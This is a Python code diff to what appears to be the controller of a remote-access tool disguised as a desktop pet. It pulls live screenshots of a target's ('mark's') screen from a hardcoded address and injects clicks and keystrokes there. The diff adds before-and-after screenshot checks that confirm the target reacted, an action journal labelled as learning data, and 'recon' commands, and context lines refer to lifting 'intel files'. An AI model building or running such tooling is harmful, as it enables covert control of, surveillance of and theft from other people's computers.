@@ -23,7 +23,9 @@ import time
 
 HERE = os.path.dirname(os.path.abspath(__file__))
 CMD_FILE = os.path.join(HERE, "cmd.json")
+JOURNAL = os.path.join(HERE, "journal.jsonl")   # action -> observed outcome (the learning data)
 STATE_URL = os.environ.get("PETCAM_STATE", "http://100.86.251.100:9101/state")
+LATEST_URL = os.environ.get("PETCAM_LATEST", "http://100.86.251.100:9101/latest.jpg")
 CONTROL_URL = os.environ.get("PETCAM_CONTROL", "http://100.86.251.100:9101/control")
 POLL = 2.0
 STALE_AFTER = 5.0          # seconds without a new frame before "stale"
@@ -136,24 +138,110 @@ def push_control(evt):
         return "control down: " + str(e)
 
 
+def fetch_frame():
+    """Current feed frame as raw JPEG bytes, or None when the feed is down."""
+    import urllib.request
+    try:
+        with urllib.request.urlopen(LATEST_URL, timeout=3) as r:
+            return r.read()
+    except Exception:
+        return None
+
+
+def _thumb(jpeg_bytes):
+    """Downscaled grayscale thumbnail (128x72) as a flat list of ints —
+    enough to measure how much of the frame changed between two shots."""
+    from io import BytesIO
+    from PIL import Image
+    try:
+        im = Image.open(BytesIO(jpeg_bytes)).convert("L").resize((128, 72))
+        return list(im.getdata())
+    except Exception:
+        return None
+
+
+def journal(entry):
+    """Append one action->outcome line to journal.jsonl (the harness's
+    eval/learning data). Never throws. Large transient fields (frame images)
+    are stripped before the line is written."""
+    try:
+        row = {k: v for k, v in entry.items() if k not in ("before_img",)}
+        with open(JOURNAL, "a") as f:
+            f.write(json.dumps(row) + "\n")
+    except Exception:
+        pass
+
+
+def verify_action(entry, settle=1.5):
+    """Close the loop on a fired action: did the mark's screen actually
+    respond? `entry["before_img"]` holds the pre-action frame bytes. Sleeps
+    `settle` for the sender to apply + a new frame to arrive, then measures
+    the pixel-diff ratio of the thumbnails. Returns the diff ratio (float)
+    or None (feed down, unverifiable) and journaled entry carries
+    `changed` (bool) + `diff` (ratio)."""
+    time.sleep(settle)
+    after = fetch_frame()
+    before = entry.get("before_img")
+    if not after or not before:
+        entry["changed"] = None
+        entry["diff"] = None
+        entry["frame_after"] = None
+        journal(entry)
+        return None
+    import hashlib
+    entry["frame_after"] = hashlib.sha1(after).hexdigest()[:12]
+    tb, ta = _thumb(before), _thumb(after)
+    if tb is None or ta is None:
+        entry["changed"] = None
+        entry["diff"] = None
+        journal(entry)
+        return None
+    diff = sum(1 for a, b in zip(tb, ta) if abs(a - b) > 24) / len(tb)
+    diff = round(diff, 4)
+    entry["diff"] = diff
+    entry["changed"] = diff > 0.005   # ~1 pixel in 200: below that = no response
+    journal(entry)
+    return diff
+
+
 def inject_click(feed_x=None, feed_y=None, button=1):
     """Score, via the pet: pointer = where the spotter stands (or the aim
     override), mapped into feed space and pushed down the control channel.
-    The SENDER applies it on the mark's own screen (SendInput) — no loop."""
+    The SENDER applies it on the mark's own screen (SendInput) — no loop.
+    Then verifies: did the mark's screen actually respond? (outcome is
+    journaled — the harness's learning data)."""
     fx, fy = pet_pointer(feed_x, feed_y)
     fx = min(max(fx, 0), FEED_W); fy = min(max(fy, 0), FEED_H)
+    before_img = fetch_frame()
+    entry = {"t": time.time(), "cmd": "click", "x": fx, "y": fy,
+             "button": button, "before_img": before_img}
     res = push_control({"type": "click", "x": fx, "y": fy, "button": button})
-    return f"score: crosshair {fx},{fy} (spotter spot) -> {res}"
+    entry["result"] = res
+    verify_action(entry)
+    ch = entry.get("changed")
+    verdict = {True: "mark responded (diff " + str(entry.get("diff")) + ")",
+               False: "no visible response (diff " + str(entry.get("diff")) + ")",
+               None: "unverifiable (feed down)"}[ch]
+    return f"score: crosshair {fx},{fy} -> {res}; {verdict}"
 
 
 def inject_type(text):
     """Score, via the pet: the cursor moves to the crosshair (the spotter's
     spot), then keystrokes land there — so whatever is under the crosshair
-    on the mark's screen receives the typing."""
+    on the mark's screen receives the typing. Outcome verified + journaled."""
     fx, fy = pet_pointer()
     fx = min(max(int(fx), 0), FEED_W); fy = min(max(int(fy), 0), FEED_H)
+    before_img = fetch_frame()
+    entry = {"t": time.time(), "cmd": "type", "text": text,
+             "x": fx, "y": fy, "before_img": before_img}
     res = push_control({"type": "type", "text": text, "x": fx, "y": fy})
-    return f"score: typed {len(text)} chars at crosshair {fx},{fy} -> {res}"
+    entry["result"] = res
+    verify_action(entry)
+    ch = entry.get("changed")
+    verdict = {True: "mark responded (diff " + str(entry.get("diff")) + ")",
+               False: "no visible response (diff " + str(entry.get("diff")) + ")",
+               None: "unverifiable (feed down)"}[ch]
+    return f"score: typed {len(text)} chars at crosshair {fx},{fy} -> {res}; {verdict}"
 
 
 def main():
@@ -250,6 +338,34 @@ def handle_cmd(cmd):
                     pet_think(f"loot lifted: {len(dumps)} intel files in the vault")
         except Exception as e:
             pet_think(f"loot failed: {e}")
+    elif c == "recon":
+        # Observation only: no action, just log what the mark's screen
+        # currently looks like. Fingerprint + feed state -> journal.
+        import urllib.request, hashlib
+        raw = fetch_frame()
+        fp = hashlib.sha1(raw).hexdigest()[:12] if raw else None
+        entry = {"t": time.time(), "cmd": "recon", "frame_before": fp}
+        try:
+            with urllib.request.urlopen(STATE_URL, timeout=3) as r:
+                st = json.load(r)
+            entry["feed_age"] = round(time.time() - st.get("last_frame_at", 0), 1)
+            entry["feed_frames"] = st.get("frames", 0)
+        except Exception:
+            entry["feed_age"] = None
+        journal(entry)
+        pet_think(f"recon: frame {fp or 'none'} (age {entry.get('feed_age')}s)")
+    elif c == "journal":
+        # Peek: last journal lines as the pet's thought (the harness's own
+        # action->outcome memory, surfaced).
+        try:
+            lines = open(JOURNAL).read().strip().splitlines()[-3:]
+            for ln in lines:
+                e = json.loads(ln)
+                ch = e.get("changed")
+                verdict = {True: "responded", False: "silent", None: "n/a"}[ch]
+                pet_think(f"journal: {e.get('cmd')} -> {verdict} ({e.get('result') or 'observed'})")
+        except FileNotFoundError:
+            pet_think("journal: empty (no actions logged yet)")
     else:
         pet_think(f"cmd? {c}")
 
